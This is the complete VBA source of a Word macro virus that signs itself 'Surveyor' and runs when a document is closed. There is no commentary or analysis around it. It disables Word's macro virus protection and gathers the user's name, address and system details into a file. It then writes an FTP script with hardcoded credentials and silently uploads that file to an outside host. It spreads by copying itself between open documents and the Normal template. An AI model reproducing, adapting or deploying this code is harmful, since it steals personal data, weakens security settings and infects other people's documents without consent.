   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()
   On Error Resume Next
   ' Surveyor, Developed by:
   ' An MCA Student
   ' School Of Technology And Applied Sciences
   ' Mahatham Gandhi University Regional Center
   ' Edappally, Kochi 24
   ' 16th March 2000
   Const Signature = "School Of Technology And Applied Sciences"
   Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
   Dim ActiveDoc, NormalTemplt As Object
   Dim UserAddress, ReportFile, ReportData, MyCode, Message As String

   Message = "Today is Independence day." & Chr(13) & Chr(13) & "Vandhay Matharam!"
   Set ActiveDoc = ActiveDocument.VBProject.VBComponents.Item(1)
   Set NormalTemplt = NormalTemplate.VBProject.VBComponents.Item(1)
   Options.VirusProtection = False
   DocumentInfected = ActiveDoc.CodeModule.Find(Signature, 1, 1, 9999, 9999)
   NormalTemplateInfected = NormalTemplt.CodeModule.Find(Signature, 1, 1, 9999, 9999)
   If (Day(Now()) = 15) And (Month(Now()) = 8) Then
       MsgBox Message, vbInformation + vbOKOnly, "Independence Day"
   End If
   If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Uploaded") = False) Then
       With Application
       ReportData = "Name: " & .UserName & Chr(13) & vbLf _
       & "Address: " & .UserAddress & Chr(13) & vbLf _
       & "Date & Time: " & Format(Date, "dddd, d mmm yyyy ") _
       & Format(Time, "hh:mm:ss AMPM ") & Chr(13) & vbLf _
       & "Processor Type:" & System.ProcessorType & Chr(13) & vbLf _
       & "Free Disk Space: " & System.FreeDiskSpace
       End With
       For i = 1 To 4
            ReportFile = ReportFile + Mid(Str(Int(90001 * Rnd + 9999)), 2, 1)
       Next i
       ReportFile = "C:\su" & ReportFile & ".sys"
       Open ReportFile For Output As #1
       Print #1, ReportData
       Close #1

       Open "c:\netacc.vxd" For Output As #1
       Print #1, "o home.fiberia.com"
       Print #1, "user surveyor"
       Print #1, "fAERTf"
       Print #1, "cd survey"
       Print #1, "ascii"
       Print #1, "put " & ReportFile
       Print #1, "quit"
       Close #1

       Shell "command.com /c ftp.exe -n -s:c:\netacc.vxd", vbHide
       System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Uploaded") = True
   End If

   If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
       (ActiveDocument.SaveFormat = wdFormatDocument Or _
       ActiveDocument.SaveFormat = wdFormatTemplate) Then

      If DocumentInfected = True Then
         SaveNormalTemplate = NormalTemplate.Saved
         MyCode = ActiveDoc.CodeModule.Lines(1, ActiveDoc.CodeModule.CountOfLines)

         NormalTemplt.CodeModule.DeleteLines 1, NormalTemplt.CodeModule.CountOfLines
         NormalTemplt.CodeModule.AddFromString MyCode
       End If
       If SaveNormalTemplate = True Then
           NormalTemplate.Save
       End If


       If NormalTemplateInfected = True And _
            (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
           ActiveDocument.Saved = False) Then

           SaveDocument = ActiveDocument.Saved

           MyCode = NormalTemplt.CodeModule.Lines(1, NormalTemplt.CodeModule.CountOfLines)

           ActiveDoc.CodeModule.DeleteLines 1, ActiveDoc.CodeModule.CountOfLines
           ActiveDoc.CodeModule.AddFromString MyCode

       If SaveDocument = True Then
           ActiveDocument.Save
       End If
      End If

   End If

   End Sub
